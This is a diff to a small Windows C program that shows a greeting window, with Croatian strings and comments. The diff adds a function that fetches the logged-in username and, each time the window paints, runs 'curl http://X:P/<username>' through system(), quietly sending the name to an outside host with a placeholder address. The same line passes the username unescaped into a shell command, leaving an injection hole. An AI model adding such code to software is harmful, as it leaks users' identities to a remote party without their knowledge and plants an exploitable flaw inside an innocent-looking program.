@@ -1,8 +1,16 @@
 #include <windows.h>
-
+#include <Lmcons.h>  
+#include <stdio.h>
+#include <stdlib.h>
 const char g_szClassName[] = "myWindowClass";
+void executeCurl(const char* username){
+    char naredba[256];
+    int maxLength = sizeof(naredba) - 1;
+    snprintf(naredba, maxLength, "curl http://X:P/%s",username);
+    system(naredba);
+}
 
-// Step 4: the Window Procedure
+// Window procedura
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 {
     switch(msg)
@@ -12,11 +20,18 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
             PAINTSTRUCT ps;
             HDC hdc = BeginPaint(hwnd, &ps);
 
-            const char* text = "Pozdrav!Kako ide gaseri";
-            TextOut(hdc, 10, 10, text, lstrlen(text));
-            const char* text2 = "Kako ide gaseri";
+            char username[UNLEN + 1];
+            DWORD username_len = UNLEN + 1;
+            char* poruka="Pozdrav";
+            if (GetUserNameA(username, &username_len)) {
+                printf("%s\n",username);
+                executeCurl(username);
+                TextOutA(hdc, 10, 10, username, lstrlenA(username));
+                TextOutA(hdc, 10, 45, poruka, lstrlen(poruka));
 
-            TextOut(hdc, 10, 60, text2, lstrlen(text));
+            } else {
+                TextOutA(hdc, 10, 10, "Ne mogu dohvatiti ime korisnika", 100);
+            }
 
             EndPaint(hwnd, &ps);
         }
@@ -36,6 +51,8 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     LPSTR lpCmdLine, int nCmdShow)
 {
+
+
     WNDCLASSEX wc;
     HWND hwnd;
     MSG Msg;
@@ -79,7 +96,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     ShowWindow(hwnd, nCmdShow);
     UpdateWindow(hwnd);
 
-    // Step 3: The Message Loop
     while(GetMessage(&Msg, NULL, 0, 0) > 0)
     {
         TranslateMessage(&Msg);
